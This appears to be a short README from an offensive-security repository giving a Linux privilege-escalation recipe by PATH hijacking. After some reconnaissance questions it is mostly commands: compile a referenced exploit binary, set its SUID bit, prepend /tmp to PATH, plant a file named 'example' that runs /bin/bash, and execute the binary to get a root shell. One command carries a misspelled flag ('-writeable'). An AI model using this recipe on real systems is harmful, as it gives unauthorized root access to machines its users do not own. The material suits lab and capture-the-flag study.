# PATH

## Example:

### echo $PATH

## Questions before using this privesc vector:

### 1: What folders are located under $PATH?

### 2: Does your current user have write privileges for any of these folders?

### 3: Can you modify $PATH?

### 4: Is there a script/app you can start that will be affected by this vulnerability?

### Example script is at root shells directory in this repository:

## Compilation: 

    gcc path_exp.c -o path -w

### Give SUID bit 

    chmod u+s path

### Find writeable directories

    find / -writeable 2>/dev/null

### Add /tmp to PATH

    export PATH=/tmp:$PATH 

### Go to /tmp directory

    cd /tmp

### Insert bash binary execution command in our example file

    echo "/bin/bash" > example

### Give execute permissions

    chmod 777 example

### Run file

    ./path
